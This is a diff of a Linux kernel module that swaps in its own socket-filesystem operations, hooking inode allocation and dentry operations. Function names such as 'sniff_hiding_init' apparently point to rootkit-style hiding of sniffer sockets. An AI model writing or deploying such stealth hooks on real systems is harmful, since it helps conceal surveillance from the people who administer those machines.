@@ -28,7 +28,8 @@ static DECLARE_KFIFO(unhooked_sockets, struct socket *, FIFO_SIZE);
 static DEFINE_SPINLOCK(read_lock);
 static DEFINE_SPINLOCK(write_lock);
 
-static struct inode *(*original_alloc_inode)(struct super_block *sb);
+static const struct super_operations *original_s_op;
+static const struct dentry_operations *original_s_d_op;
 
 static struct inode *hooked_alloc_inode(struct super_block *sb) {
     struct inode *res;
@@ -36,7 +37,9 @@ static struct inode *hooked_alloc_inode(struct super_block *sb) {
     unsigned long flags;
     struct wait_queue_entry *wq;
 
-    res = original_alloc_inode(sb);
+    // TODO: panic
+    if (!original_s_op) return ERR_PTR(-ENOMEM);
+    res = original_s_op->alloc_inode(sb);
     sock = SOCKET_I(res);
 
     /* Add wait queue entry */
@@ -74,7 +77,7 @@ static int hooked_d_init(struct dentry *dentry)
 	return 0;
 }
 
-int MRK_init_sockets_hook(void) {
+int sniff_hiding_init(void) {
     struct file_system_type *fs_type;
     struct super_block *super;
     struct super_operations *s_op;
@@ -85,14 +88,21 @@ int MRK_init_sockets_hook(void) {
 
     fs_type = get_fs_type("sockfs");
 
+    // TODO: hook new super blocks when they are created.
+
     hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
-        s_op = (struct super_operations *)kmalloc(sizeof(struct super_operations), GFP_KERNEL);
+        if (!original_s_op) original_s_op = super->s_op;
+        else if (original_s_op != super->s_op) return -1;
+
+        if (!original_s_d_op) original_s_d_op = super->s_d_op;
+        else if (original_s_d_op != super->s_d_op) return -1;
+
+        s_op = kmalloc(sizeof(struct super_operations), GFP_KERNEL);
         memcpy(s_op, super->s_op, sizeof(struct super_operations));
         super->s_op = s_op;
-        original_alloc_inode = s_op->alloc_inode;
         s_op->alloc_inode = &hooked_alloc_inode;
 
-        s_d_op = (struct dentry_operations *)kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
+        s_d_op = kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
         memcpy(s_d_op, super->s_d_op, sizeof(struct dentry_operations));
         super->s_d_op = s_d_op;
         
@@ -101,6 +111,27 @@ int MRK_init_sockets_hook(void) {
     return 0;
 }
 
-void MRK_exit_sockets_hook(void) {
+void sniff_hiding_exit(void) {
+    struct file_system_type *fs_type;
+    struct super_block *super;
+    struct super_operations *s_op;
+    struct dentry_operations *s_d_op;
+    
+    
+    fs_type = get_fs_type("sockfs");
+    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
+        // Since we currently don't hook into new supers.
+        if (original_s_op == super->s_op) continue;
+        if (original_s_d_op == super->s_d_op) continue;
+
+        s_op = super->s_op;
+        s_d_op = super->s_d_op;
+        super->s_op = original_s_op;
+        super->s_d_op = original_s_d_op;
+        kfree(s_op);
+        kfree(s_d_op);
+    }
+   
     kfifo_free(&unhooked_sockets);
+    hook_exit();
 }
